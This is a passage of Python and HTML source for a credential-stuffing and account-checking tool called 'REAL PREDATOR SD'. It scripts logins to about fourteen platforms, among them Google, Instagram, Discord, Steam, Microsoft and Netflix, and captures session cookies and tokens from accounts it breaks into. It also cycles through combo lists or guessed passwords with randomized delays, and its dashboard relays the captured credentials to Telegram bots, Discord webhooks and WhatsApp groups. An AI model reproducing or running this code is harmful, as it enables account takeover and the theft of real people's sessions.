            csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text, re.I)
            if not csrf: return None
            headers = {'X-CSRFToken': csrf.group(1), 'X-Requested-With': 'XMLHttpRequest'}
            data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'}
            login = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=10)
            
            if '"authenticated":true' in login.text:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                token = csrf.group(1)
                user_id = None
                user_match = re.search(r'"userId":"([^"]+)"', login.text, re.I)
                if user_match:
                    user_id = user_match.group(1)
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': user_id or 'N/A',
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_twitter(self, username, password, session):
        try:
            resp = session.get("https://twitter.com/login", timeout=10)
            csrf = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None
            login = session.post("https://twitter.com/sessions", data={
                'authenticity_token': csrf.group(1),
                'session[username_or_email]': username,
                'session[password]': password
            }, allow_redirects=True, timeout=10)
            if 'home' in login.url:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                auth_token = cookies.get('auth_token', 'N/A')
                return {
                    'success': True,
                    'token': auth_token,
                    'cookie': cookie_str,
                    'user_id': 'N/A',
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_google(self, username, password, session):
        try:
            resp = session.get("https://accounts.google.com/ServiceLogin", timeout=10)
            galx = re.search(r'name="GALX"[^>]*value="([^"]+)"', resp.text, re.I)
            if not galx: return None
            data = {'Email': username, 'Passwd': password, 'GALX': galx.group(1), 'signIn': 'Sign in'}
            login = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=10)
            if 'mail.google.com' in login.url:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                sid = cookies.get('SID', 'N/A')
                hsid = cookies.get('HSID', 'N/A')
                return {
                    'success': True,
                    'token': f"SID={sid}; HSID={hsid}",
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_github(self, username, password, session):
        try:
            resp = session.get("https://github.com/login", timeout=10)
            csrf = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None
            login = session.post("https://github.com/session", data={
                'login': username,
                'password': password,
                'authenticity_token': csrf.group(1)
            }, allow_redirects=True, timeout=10)
            if 'github.com' in login.url and 'login' not in login.url:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                user_session = cookies.get('user_session', 'N/A')
                return {
                    'success': True,
                    'token': user_session,
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_discord(self, username, password, session):
        try:
            login = session.post("https://discord.com/api/v9/auth/login", json={
                'login': username,
                'password': password
            }, timeout=10)
            if login.status_code == 200:
                data = login.json()
                token = data.get('token', 'N/A')
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': data.get('user_id', 'N/A'),
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_steam(self, username, password, session):
        try:
            resp = session.get("https://store.steampowered.com/login/", timeout=10)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None
            login = session.post("https://store.steampowered.com/login/dologin/", data={
                'username': username,
                'password': password,
                'csrf_token': csrf.group(1)
            }, timeout=10)
            result = login.json()
            if result.get('success'):
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                steam_login = cookies.get('steamLogin', 'N/A')
                return {
                    'success': True,
                    'token': steam_login,
                    'cookie': cookie_str,
                    'user_id': result.get('steamID', 'N/A'),
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_reddit(self, username, password, session):
        try:
            login = session.post("https://www.reddit.com/api/login", data={
                'user': username,
                'passwd': password,
                'api_type': 'json'
            }, timeout=10)
            result = login.json()
            if result.get('json', {}).get('data', {}).get('modhash'):
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                modhash = result['json']['data'].get('modhash', 'N/A')
                return {
                    'success': True,
                    'token': modhash,
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_telegram(self, username, password, session):
        try:
            login = session.post("https://my.telegram.org/auth", data={
                'phone': username,
                'password': password
            }, timeout=10)
            if login.status_code == 200:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                tg_auth = cookies.get('tg_auth', 'N/A')
                return {
                    'success': True,
                    'token': tg_auth,
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_microsoft(self, username, password, session):
        try:
            resp = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=10)
            ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', resp.text, re.I)
            if not ppft: return None
            login = session.post('https://login.live.com/oauth20_authorize.srf', data={
                'login': username,
                'loginfmt': username,
                'passwd': password,
                'PPFT': ppft.group(1),
                'type': '11'
            }, allow_redirects=True, timeout=10)
            if 'access_token' in login.url:
                token_match = re.search(r'access_token=([^&]+)', login.url)
                token = token_match.group(1) if token_match else 'N/A'
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_spotify(self, username, password, session):
        try:
            login = session.post("https://accounts.spotify.com/api/login", data={
                'username': username,
                'password': password
            }, timeout=10)
            if login.status_code == 200:
                data = login.json()
                token = data.get('accessToken', 'N/A')
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': data.get('displayName', 'N/A'),
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_netflix(self, username, password, session):
        try:
            resp = session.get("https://www.netflix.com/login", timeout=10)
            auth_url = re.search(r'action="([^"]+)"', resp.text, re.I)
            if not auth_url: return None
            login = session.post(auth_url.group(1), data={
                'email': username,
                'password': password
            }, allow_redirects=True, timeout=10)
            if 'browse' in login.url:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                netflix_id = cookies.get('NetflixId', 'N/A')
                return {
                    'success': True,
                    'token': netflix_id,
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_twitch(self, username, password, session):
        try:
            login = session.post("https://id.twitch.tv/oauth2/token", data={
                'client_id': 'kimne78kx3ncx6brgo4mv6wki5h1ko',
                'login': username,
                'password': password,
                'grant_type': 'password'
            }, timeout=10)
            if login.status_code == 200:
                data = login.json()
                token = data.get('access_token', 'N/A')
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': data.get('user_id', 'N/A'),
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_epic(self, username, password, session):
        try:
            login = session.post("https://www.epicgames.com/id/api/login", json={
                'email': username,
                'password': password
            }, timeout=10)
            if login.status_code == 200:
                data = login.json()
                token = data.get('access_token', 'N/A')
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': data.get('account_id', 'N/A'),
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_riot(self, username, password, session):
        try:
            login = session.post("https://auth.riotgames.com/api/v1/authorization", json={
                'client_id': 'riot-client',
                'username': username,
                'password': password
            }, timeout=10)
            if login.status_code == 200:
                data = login.json()
                token = data.get('access_token', 'N/A')
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': data.get('user_id', 'N/A'),
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    # Fallback
    def check_tokens_default(self, username, password, session):
        try:
            cookies = session.cookies.get_dict()
            cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
            return {
                'success': True,
                'token': 'N/A',
                'cookie': cookie_str,
                'user_id': 'N/A',
                'session_data': {'cookies': cookies}
            }
        except:
            return None

    def __getattr__(self, name):
        if name.startswith('check_tokens_'):
            platform_check = name.replace('check_tokens_', '')
            if platform_check in ['gmail', 'outlook', 'youtube', 'gemini']:
                return self.check_tokens_google
            if platform_check in ['xbox', 'copilot']:
                return self.check_tokens_microsoft
            if platform_check in ['valorant']:
                return self.check_tokens_riot
            if platform_check in ['fortnite']:
                return self.check_tokens_epic
            if platform_check in ['apex', 'ea']:
                return self.check_tokens_default
        return None

# ================================================================
# STATE
# ================================================================
state = {
    'running': False,
    'checked': 0,
    'hits': 0,
    'bad': 0,
    'errors': 0,
    'feed': [],
    'results': [],
    'current_testing': [],
    'lock': threading.Lock(),
    'cpm': 0,
    'start_time': None,
    'total': 0,
    'generation_mode': False,
    'generated_count': 0
}

predator = UltimatePredator()

# ================================================================
# PREDATOR LOOP - WITH GENERATION MODE
# ================================================================
def predator_loop():
    last_count = 0
    last_time = datetime.now()
    generation_index = 0
    
    while state['running']:
        try:
            # وضع التوليد من القائمة
            if predator.generation_mode and predator.generated_accounts:
                if generation_index < len(predator.generated_accounts):
                    username, password = predator.generated_accounts[generation_index]
                    generation_index += 1
                    
                    with state['lock']:
                        state['generated_count'] = generation_index
                        state['current_testing'] = [{'username': username, 'platform': 'Hunting', 'status': 'testing'}]
                    
                    # تنفيذ الصيد
                    predator.smart_hunt_with_tokens(username, password)
                    
                    with state['lock']:
                        state['checked'] += 1
                    
                    # تحديث الفيد
                    with state['lock']:
                        state['feed'] = predator.feed[-80:]
                        state['results'] = predator.results[-50:]
                        state['hits'] = predator.hits
                        state['bad'] = predator.bad
                        state['current_testing'] = predator.current_testing
                        if predator.generation_mode:
                            state['generated_count'] = generation_index
                else:
                    # إعادة تدوير القائمة
                    if predator.generation_mode and predator.generated_accounts:
                        generation_index = 0
                        random.shuffle(predator.generated_accounts)
                        with state['lock']:
                            state['feed'].append({
                                'type': 'info',
                                'text': f"🔄 Re-cycling {len(predator.generated_accounts)} accounts - new variations",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
            else:
                # وضع عادي
                if predator.combos:
                    combo = predator.combos.pop(0)
                    predator.smart_hunt_with_tokens(combo[0], combo[1])
                else:
                    # توليد عشوائي
                    names = ['john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed','lisa','anna','maria','james','robert','william','olivia','sophia','isabella','mia']
                    domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com', 'protonmail.com']
                    name = random.choice(names) + str(random.randint(1, 9999))
                    domain = random.choice(domains)
                    pwd = name + random.choice(['123', '2024', '!@#', '12345', 'password'])
                    predator.smart_hunt_with_tokens(f"{name}@{domain}", pwd)
                
                with state['lock']:
                    state['checked'] += 1
            
            # تحديث الفيد والنتائج
            with state['lock']:
                state['feed'] = predator.feed[-80:]
                state['results'] = predator.results[-50:]
                state['hits'] = predator.hits
                state['bad'] = predator.bad
                state['current_testing'] = predator.current_testing
                if predator.generation_mode:
                    state['generated_count'] = generation_index
            
            # حساب RPM
            now = datetime.now()
            elapsed = (now - last_time).total_seconds()
            if elapsed >= 60:
                with state['lock']:
                    state['cpm'] = int((state['checked'] - last_count) / (elapsed / 60))
                last_count = state['checked']
                last_time = now
            
            # تأخير ذكي - سرعة عالية
            delay = random.uniform(3, 8)
            time.sleep(delay)
            
        except Exception as e:
            with state['lock']:
                state['errors'] += 1
            time.sleep(1)

# ================================================================
# HTML TEMPLATES (SAME AS BEFORE - LOGIN + DASHBOARD)
# ================================================================

LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD - Login</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace}
.login-box{background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:16px;padding:40px;width:400px;text-align:center}
.logo-text{font-family:'Orbitron',monospace;font-size:28px;color:#00ff41}
.logo-text span{color:#ff0044}
.logo-text .sd{font-size:16px;color:#ffd700}
.subtitle{color:#006622;font-size:10px;margin:5px 0 15px;letter-spacing:3px}
.input-group input{width:100%;padding:14px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:8px;color:#00ff41;font-size:16px;text-align:center;margin:10px 0}
.btn-login{width:100%;padding:14px;background:rgba(0,255,65,0.05);border:2px solid #00ff41;border-radius:8px;color:#00ff41;font-size:16px;cursor:pointer;font-family:'Orbitron',monospace;transition:all 0.3s}
.btn-login:hover{background:rgba(0,255,65,0.1);box-shadow:0 0 40px rgba(0,255,65,0.05)}
.btn-login:disabled{opacity:0.4}
.error-msg{color:#ff0044;font-size:12px;margin-top:10px;min-height:20px}
.hint{color:#006622;font-size:8px;margin-top:8px}
.social-links{display:flex;justify-content:center;gap:20px;margin-top:15px;padding-top:15px;border-top:1px solid rgba(0,255,65,0.05)}
.social-links a{color:#006622;font-size:20px;transition:all 0.3s;text-decoration:none}
.social-links a:hover{color:#00ff41;transform:scale(1.2)}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo-text">REAL <span>PREDATOR</span> <span class="sd">SD</span></div>
    <div class="subtitle">⚡ v34.2 ULTIMATE HUNTER</div>
    <div class="input-group">
        <input type="password" id="passInput" placeholder="🔑 Enter Password">
    </div>
    <button class="btn-login" id="loginBtn">⚡ ACCESS</button>
    <div id="errorMsg" class="error-msg"></div>
    <div class="hint">🔐 Secure Access Only</div>
    <div class="social-links">
        <a href="https://t.me/MRDPY" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a>
        <a href="https://wa.me/249907118667" target="_blank" title="WhatsApp"><i class="fab fa-whatsapp"></i></a>
    </div>
</div>
<script>
const passInput=document.getElementById('passInput');
const loginBtn=document.getElementById('loginBtn');
const errorMsg=document.getElementById('errorMsg');
function doLogin(){
    const password=passInput.value.trim();
    if(!password){errorMsg.textContent='⚠️ Enter password';return;}
    loginBtn.disabled=true;loginBtn.textContent='⏳...';errorMsg.textContent='';
    fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:password})})
    .then(res=>res.json()).then(data=>{
        loginBtn.disabled=false;loginBtn.textContent='⚡ ACCESS';
        if(data.success){window.location.href='/dashboard';}
        else{errorMsg.textContent='❌ '+data.error;passInput.value='';}
    }).catch(()=>{loginBtn.disabled=false;loginBtn.textContent='⚡ ACCESS';errorMsg.textContent='⚠️ Error';});
}
loginBtn.addEventListener('click', doLogin);
passInput.addEventListener('keypress', e=>{if(e.key==='Enter')doLogin();});
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD v34.2</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;padding:10px}
.container{max-width:1500px;margin:0 auto}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;border-radius:8px 8px 0 0}
.header h1{font-family:'Orbitron',monospace;font-size:20px;color:#00ff41}
.header h1 span{color:#ff0044}
.header .sd{font-size:14px;color:#ffd700}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.2);color:#00ff41;padding:10px 22px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;transition:all 0.3s}
.btn:hover:not(:disabled){background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start:hover:not(:disabled){box-shadow:0 0 40px rgba(0,255,65,0.1)}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn-stop:hover:not(:disabled){background:rgba(255,0,68,0.05)}
.btn-generate{background:rgba(255,215,0,0.05);border-color:#ffd700;color:#ffd700}
.btn-generate:hover:not(:disabled){background:rgba(255,215,0,0.1)}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.btn-logout{color:#ff0044;border-color:#ff0044;background:transparent;padding:10px 22px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;transition:all 0.3s;border:1px solid #ff0044;text-decoration:none}
.btn-logout:hover{background:rgba(255,0,68,0.05)}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:8px;padding:15px;margin-bottom:8px}
.stats-rectangle{display:grid;grid-template-columns:repeat(8,1fr);gap:10px;margin:10px 0;padding:15px;background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:10px}
.stat-item{text-align:center;padding:12px;border-radius:8px;background:rgba(0,0,0,0.6)}
.stat-item .number{font-size:28px;font-weight:700;display:block;font-family:'Orbitron',monospace}
.stat-item .label{font-size:9px;color:#006622;margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.stat-item.hits .number{color:#00ff41}
.stat-item.bad .number{color:#ff0044}
.stat-item.total .number{color:#ffd700}
.stat-item.testing .number{color:#ffaa00}
.stat-item.rate .number{color:#0088cc}
.stat-item.time .number{color:#0066ff;font-size:22px}
.stat-item.real .number{color:#00ccff}
.stat-item.generated .number{color:#ff00ff}
.testing-box{background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.2);border-radius:8px;padding:12px;margin:8px 0;min-height:50px}
.testing-box .label{color:#ffaa00;font-size:11px}
.testing-box .content{color:#ffaa00;font-size:14px;font-weight:700;margin-top:5px}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 18px;border-radius:6px;font-size:13px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044;animation:pulse-border 2s infinite}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:8px;height:8px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044;animation:pulse-dot 1.5s infinite}
.status-dot.stopped{background:#00ff41}
@keyframes pulse-dot{0%,100%{opacity:1;box-shadow:0 0 20px rgba(255,0,68,0.3)}50%{opacity:0.3;box-shadow:0 0 60px rgba(255,0,68,0.6)}}
@keyframes pulse-border{0%,100%{border-color:#ff0044}50%{border-color:rgba(255,0,68,0.3)}}
.feed-container{max-height:150px;overflow-y:auto}
.feed-item{padding:4px 10px;font-size:10px;border-left:2px solid transparent;display:flex;gap:8px;animation:slideIn 0.3s}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.bad{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item.info{background:rgba(0,204,255,0.04);border-left-color:#00ccff}
.feed-item .time{color:#006622;font-size:8px;min-width:50px}
@keyframes slideIn{from{opacity:0;transform:translateX(-15px)}to{opacity:1;transform:translateX(0)}}
.result-container{max-height:400px;overflow-y:auto}
.result-item{padding:6px 12px;font-size:10px;border-bottom:1px solid rgba(0,255,65,0.05)}
.result-item.hit{background:rgba(0,255,65,0.03)}
.result-item.gaming{background:rgba(255,215,0,0.05);border-left:2px solid #ffd700}
.control-bar{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.config-row input{padding:8px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:11px;font-family:'Share Tech Mono',monospace}
.config-row input:focus{outline:none;border-color:#00ff41}
.config-row textarea{padding:8px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:11px;font-family:'Share Tech Mono',monospace;width:100%;min-height:120px;resize:vertical}
.config-row textarea:focus{outline:none;border-color:#00ff41}
.platform-select{display:flex;gap:10px;align-items:center;flex-wrap:wrap;background:rgba(0,0,0,0.5);padding:12px 15px;border-radius:6px;border:1px solid rgba(0,255,65,0.05)}
.platform-select select{padding:8px 14px;background:rgba(0,0,0,0.8);color:#00ff41;border:1px solid #00ff41;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:11px;min-width:200px}
.platform-select select:focus{outline:none}
.empty-state{text-align:center;padding:20px;color:#006622;font-size:11px}
.gaming-badge{color:#ffd700;margin-right:5px}
.group-config{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;padding:10px;background:rgba(0,0,0,0.5);border-radius:6px;border:1px solid rgba(0,255,65,0.05)}
.group-config input{padding:6px 10px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:10px;font-family:'Share Tech Mono',monospace;width:100%}
.group-config input:focus{outline:none;border-color:#00ff41}
.group-config label{color:#006622;font-size:9px}
.generation-box{background:rgba(255,215,0,0.03);border:2px dashed rgba(255,215,0,0.15);border-radius:8px;padding:15px;margin:10px 0}
.generation-box .title{color:#ffd700;font-size:14px;margin-bottom:8px}
.generation-box textarea{width:100%;min-height:150px;padding:12px;background:rgba(0,0,0,0.8);border:1px solid rgba(255,215,0,0.1);border-radius:6px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:12px;resize:vertical}
.generation-box textarea:focus{outline:none;border-color:#ffd700}
.generation-box .hint{color:#006622;font-size:9px;margin-top:5px}
.generation-box .controls{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
.token-display{background:rgba(0,0,0,0.6);border:1px solid rgba(0,255,65,0.05);border-radius:4px;padding:8px;margin-top:4px;font-size:9px;color:#0088cc;word-break:break-all}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:5px;padding:8px;background:rgba(0,0,0,0.3);border-radius:6px;max-height:180px;overflow-y:auto}
.bot-status{display:flex;align-items:center;gap:10px;padding:8px 15px;background:rgba(0,0,0,0.3);border-radius:6px;border:1px solid rgba(0,255,65,0.05)}
.test-result{font-size:10px;padding:4px 10px;border-radius:4px}
.test-result.success{background:rgba(0,255,65,0.1);color:#00ff41}
.test-result.failed{background:rgba(255,0,68,0.1);color:#ff0044}
.feature-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:8px;background:rgba(0,255,65,0.1);color:#00ff41;margin:2px}
@media(max-width:768px){.stats-rectangle{grid-template-columns:repeat(4,1fr)}}
</style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>REAL <span>PREDATOR</span> <span class="sd">SD</span> <span style="font-size:12px;color:#006622;">v34.2</span></h1>
        <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
            <span style="color:#006622;font-size:9px;"><i class="fas fa-file-alt"></i> Tokens & Cookies as files</span>
            <a href="/logout" class="btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </div>
    </header>

    <div class="platform-select">
        <label>🎯 Target Platform:</label>
        <select id="targetPlatform">
            <option value="">🔄 Random (All {{ platforms|length }} Platforms)</option>
            {% for p in platforms %}
            <option value="{{ p.name }}">{{ p.name }}</option>
            {% endfor %}
        </select>
        <button class="btn" id="applyTargetBtn" style="border-color:#ffd700;color:#ffd700;padding:6px 16px;">Apply</button>
        <span id="targetStatus" style="color:#006622;font-size:11px;">⚪ Random</span>
    </div>

    <!-- ========================================================== -->
    <!-- GENERATION FROM NAMES LIST - WITH VARIETY -->
    <!-- ========================================================== -->
    <div class="generation-box">
        <div class="title"><i class="fas fa-users"></i> GENERATE ACCOUNTS FROM NAMES LIST</div>
        <div class="hint">📝 Paste usernames (one per line) - The system will generate EMAILS + PHONES + USERNAMES with VARIETY</div>
        <textarea id="namesInput" placeholder="john&#10;mike&#10;sarah&#10;emma&#10;alex&#10;jordan">john&#10;mike&#10;sarah&#10;emma</textarea>
        <div class="controls">
            <button class="btn btn-generate" id="generateBtn"><i class="fas fa-cogs"></i> GENERATE & TEST</button>
            <button class="btn" id="stopGenerationBtn" style="border-color:#ff0044;color:#ff0044;" disabled><i class="fas fa-stop"></i> Stop</button>
            <span id="genStatus" style="color:#006622;font-size:11px;">⚪ Idle</span>
            <span id="genCount" style="color:#ffd700;font-size:11px;">📊 0 generated</span>
        </div>
        <div style="margin-top:8px;display:flex;gap:10px;flex-wrap:wrap;">
            <span class="feature-badge"><i class="fas fa-envelope"></i> Emails</span>
            <span class="feature-badge"><i class="fas fa-phone"></i> Phones</span>
            <span class="feature-badge"><i class="fas fa-user"></i> Usernames</span>
            <span class="feature-badge"><i class="fas fa-sync"></i> 2 attempts only</span>
            <span class="feature-badge"><i class="fas fa-file"></i> Tokens + Cookies</span>
        </div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#ffd700;margin-bottom:6px;">📢 <span style="color:#006622;">GROUP SHARING</span></div>
        <div class="group-config">
            <div><label>🤖 Telegram Bot Token</label><input type="text" id="tgToken" placeholder="Bot Token"></div>
            <div><label>💬 Telegram Chat ID</label><input type="text" id="tgChatId" placeholder="Chat ID"></div>
            <div><label>📱 WhatsApp Group ID</label><input type="text" id="waGroupId" placeholder="Group ID"></div>
            <div><label>🎮 Discord Webhook</label><input type="text" id="dcWebhook" placeholder="Webhook URL"></div>
            <div><button class="btn" id="configGroupBtn" style="border-color:#ffd700;color:#ffd700;padding:6px 16px;width:100%;">Apply</button></div>
        </div>
        <div style="display:flex;gap:15px;flex-wrap:wrap;align-items:center;margin-top:8px;">
            <div id="groupStatus" style="color:#006622;font-size:10px;">⚪ Disabled</div>
            <button class="btn" id="testBotBtn" style="padding:6px 16px;"><i class="fas fa-paper-plane"></i> Test Bot</button>
            <div id="testResult" class="test-result" style="display:none;"></div>
        </div>
    </div>

    <div class="stats-rectangle" id="statsRectangle">
        <div class="stat-item hits"><span class="number" id="statHits">0</span><span class="label">✅ HITS</span></div>
        <div class="stat-item bad"><span class="number" id="statBad">0</span><span class="label">❌ BAD</span></div>
        <div class="stat-item total"><span class="number" id="statTotal">0</span><span class="label">📊 TOTAL</span></div>
        <div class="stat-item testing"><span class="number" id="statTesting">0</span><span class="label">🔄 TESTING</span></div>
        <div class="stat-item rate"><span class="number" id="statRate">0%</span><span class="label">📈 SUCCESS</span></div>
        <div class="stat-item time"><span class="number" id="statTime">00:00</span><span class="label">⏱ ELAPSED</span></div>
        <div class="stat-item real"><span class="number" id="statReal">0</span><span class="label">🎯 REAL</span></div>
        <div class="stat-item generated"><span class="number" id="statGenerated">0</span><span class="label">📦 GEN</span></div>
    </div>

    <div class="testing-box">
        <div class="label">🔄 CURRENTLY TESTING</div>
        <div class="content" id="currentTesting">⏳ Waiting...</div>
    </div>

    <div class="card">
        <div style="display:flex;gap:15px;flex-wrap:wrap;align-items:center;">
            <span class="status-badge stopped" id="statusBadge">
                <span class="status-dot stopped" id="statusDot"></span>
                <span id="statusText">OFF</span>
            </span>
            <span style="color:#006622;font-size:11px;">⚡ <span id="cpm">0</span> RPM</span>
            <span style="color:#ff0044;">⚠️ <span id="errorCount">0</span></span>
            <span style="color:#00ccff;font-size:10px;">🎯 Real Checks: <span id="realCount">0</span></span>
        </div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn" id="clearBtn" style="border-color:rgba(255,255,255,0.1);color:#006622;"><i class="fas fa-trash"></i> Clear</button>
            <div class="config-row">
                <label>Speed:</label>
                <input type="number" id="speedInput" value="8" min="1" max="15" style="width:60px;">
                <span style="color:#006622;font-size:9px;">accounts/min</span>
            </div>
        </div>
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;padding-top:8px;border-top:1px solid rgba(0,255,65,0.05);">
            <div class="config-row">
                <label><i class="fas fa-upload"></i> Combo:</label>
                <input type="file" id="comboFile" accept=".txt" style="display:none;">
                <label for="comboFile" style="padding:6px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;cursor:pointer;font-size:10px;">Choose</label>
                <span id="comboName" style="color:#006622;font-size:9px;">None</span>
            </div>
